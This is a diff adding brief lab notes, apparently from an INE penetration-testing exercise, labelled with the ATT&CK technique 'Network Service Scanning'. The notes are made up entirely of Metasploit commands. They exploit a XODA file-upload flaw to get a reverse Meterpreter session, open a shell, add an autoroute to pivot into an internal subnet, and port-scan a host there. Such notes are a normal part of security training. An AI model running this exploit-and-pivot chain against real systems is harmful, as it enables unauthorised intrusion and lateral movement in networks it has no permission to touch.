@@ -1,0 +1,26 @@
+T1046 : Network Service Scanning
+
+msfconsole
+use exploit/unix/webapp/xoda_file_upload
+set RHOSTS demo1.ine.local
+set TARGETURI /
+set LHOST 192.63.4.2
+exploit
+
+meterpreter
+shell
+ip addr
+exit
+
+meterpreter
+run autoroute -s 192.180.108.2
+
+ctrl+z
+
+use auxiliary/scanner/portscan/tcp
+set RHOSTS 192.180.108.3
+set verbose false
+set ports 1-1000
+exploit
+
+
